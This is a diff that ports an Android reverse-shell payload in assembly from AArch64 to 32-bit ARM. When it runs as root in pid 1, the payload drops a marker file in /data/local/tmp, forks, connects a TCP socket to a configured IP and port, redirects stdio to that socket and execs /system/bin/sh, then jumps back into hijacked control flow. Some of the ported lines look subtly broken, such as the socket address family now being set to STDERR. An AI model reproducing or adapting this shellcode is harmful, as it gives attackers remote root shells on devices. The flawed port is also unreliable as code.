@@ -22,20 +22,20 @@
  *
  */
 
-.equ SYS_OPENAT, 0x38
-.equ SYS_SOCKET, 0xc6
-.equ SYS_CONNECT, 0xcb
-.equ SYS_DUP3, 0x18
-.equ SYS_CLONE, 0xdc
-.equ SYS_EXECVE, 0xdd
-.equ SYS_EXIT, 0x5d
-.equ SYS_READLINKAT, 0x4e
-.equ SYS_GETUID, 0xae
-.equ SYS_GETPID, 0xac
+.equ SYS_OPENAT, 0x142
+.equ SYS_SOCKET, 0x119
+.equ SYS_CONNECT, 0x11b
+.equ SYS_DUP3, 0x116
+.equ SYS_CLONE, 0x78
+.equ SYS_EXECVE, 0xb
+.equ SYS_EXIT, 0x1
+.equ SYS_READLINKAT, 0x14c
+.equ SYS_GETUID, 0x18
+.equ SYS_GETPID, 0x14
 
 .equ AF_INET, 0x2
-.equ O_EXCL, 0x80
-.equ O_CREAT, 0x40
+.equ O_EXCL, 0x100
+.equ O_CREAT, 0x0200
 .equ S_IRWXU, 0x1c0
 .equ SOCK_STREAM, 0x1
 
@@ -55,7 +55,7 @@ _start:
         //
         ////////////////////////////////////////////////////////////////
 
-        stp    x0, x1, [sp,#-16]!
+        push    {r0, r1}
 
         ////////////////////////////////////////////////////////////////
         //
@@ -64,13 +64,14 @@ _start:
         //
         ////////////////////////////////////////////////////////////////
 
-        mov    x8, SYS_GETUID
-        svc    0
-        cbnz   w0, return
-        mov    x8, SYS_GETPID
-        svc    0
-        cmp    w0, 1
-        b.ne   return
+        mov    r7, #24
+        svc    #0
+        cmp    r0, #0
+        bne    return
+        mov    r7, #20
+        svc    #0
+        cmp    r0, #1
+        bne   return
 
         ////////////////////////////////////////////////////////////////
         //
@@ -80,14 +81,16 @@ _start:
         //
         ////////////////////////////////////////////////////////////////
 
-        mov    w0, 0    // dirfd is ignored
-        adr    x1, path
-        mov    w2, O_CREAT|O_EXCL
-        mov    w3, S_IRWXU
-        mov    x8, SYS_OPENAT
-        svc    0
-        cmn    x0, #1, LSL#12
-        b.hi   return
+        mov    r0, #0    // dirfd is ignored
+        adr    r1, path
+        mov    r2, #300
+        mov    r3, #448
+        ldr    r7, =__NR_openat
+        svc    #0
+	mov    r5, #12
+	mov    r6, #1
+        cmn    r0, r6, lsl r5
+        bhi   return
 
         ////////////////////////////////////////////////////////////////
         //
@@ -95,14 +98,15 @@ _start:
         //
         ////////////////////////////////////////////////////////////////
 
-        mov    x0, SIGCHLD
-        mov    x1, 0
-        mov    x2, 0
-        mov    x3, 0
-        mov    x4, 0
-        mov    x8, SYS_CLONE
-        svc    0
-        cbnz   w0, return
+        mov    r0, #17
+        mov    r1, #0
+        mov    r2, #0
+        mov    r3, #0
+        mov    r4, #0
+        mov    r7, #120
+        svc    #0
+        cmp    r0, #0
+        bne    return
 
         ////////////////////////////////////////////////////////////////
         //
@@ -111,61 +115,62 @@ _start:
         ////////////////////////////////////////////////////////////////
 
         // sockfd = socket(AF_INET, SOCK_STREAM, 0)
-        mov    x0, AF_INET
-        mov    x1, SOCK_STREAM
-        mov    x2, 0
-        mov    x8, SYS_SOCKET
-        svc    0
-        mov    x3, x0
+        mov    r0, #2
+        mov    r1, #1
+        mov    r2, #0
+        ldr    r7, =__NR_socket
+        svc    #0
+        mov    r3, r0
 
         // connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
-        adr    x1, sockaddr
-        mov    x2, 0x10
-        mov    x8, SYS_CONNECT
-        svc    0
-        cbnz   w0, exit
+        adr    r1, sockaddr
+        mov    r2, #16
+        ldr    r7, =__NR_connect
+        svc    #0
+        cmp    r0, #0
+        bne    exit
 
         // dup3(sockfd, STDIN, 0) ...
-        mov    x0, x3
-        mov    x2, 0
-        mov    x1, STDIN
-        mov    x8, SYS_DUP3
-        svc    0
-        mov    x1, STDOUT
-        mov    x8, SYS_DUP3
-        svc    0
-        mov    x1, STDERR
-        mov    x8, SYS_DUP3
-        svc    0
+        mov    r0, r3
+        mov    r2, #0
+        mov    r1, #0
+        ldr    r7, =__NR_dup3
+        svc    #0
+        mov    r1, #1
+        ldr    r7, =__NR_dup3
+        svc    #0
+        mov    r1, #2
+        ldr    r7, =__NR_dup3
+        svc    #0
 
         // execve('/system/bin/sh', NULL, NULL)
-        adr    x0, shell
-        mov    x2, 0
-        str    x0, [sp, 0]
-        str    x2, [sp, 8]
-        mov    x1, sp
-        mov    x8, SYS_EXECVE
-        svc    0
+        adr    r0, shell
+        mov    r2, #0
+        str    r0, [sp, #0]
+        str    r2, [sp, #8]
+        mov    r1, sp
+        mov    r7, #11
+        svc    #0
 
 exit:
-        mov    x0, 0
-        mov    x8, SYS_EXIT
-        svc    0
+        mov    r0, #0
+        mov    r7, #1
+        svc    #0
 
 return:
-        ldp    x0, x1, [sp],#16
-        mov    x17, x30
-        mov    x30, x16
+        pop    {r0, r1}
+        mov    r8, r14
+        mov    r14, r12
         nop
         nop
-        br     x17
+        bx     r8
 
 path:
         .string "/data/local/tmp/.x"
 
         .balign 4
 sockaddr:
-        .short AF_INET
+        .short STDERR
         .short PORT
         .word  IP
 
